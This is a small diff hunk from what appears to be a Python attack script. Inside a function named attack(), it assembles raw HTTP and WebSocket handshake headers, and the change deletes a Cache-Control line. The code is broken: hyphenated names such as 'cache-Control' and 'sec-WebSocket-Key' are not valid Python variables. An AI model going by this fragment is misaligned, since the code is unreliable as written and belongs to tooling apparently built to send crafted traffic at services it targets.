@@ -58,7 +58,6 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   pragma = "no-cache\r\n"
-  cache-Control = "no-cache\r\n"
   sec-WebSocket-Key = "+vTyWP1c0t5S5WaThYZEMw==\r\n"
   sec-WebSocket-Version = "13\r\n"
   sec-WebSocket-Extensions = "x-webkit-deflate-frame\r\n"
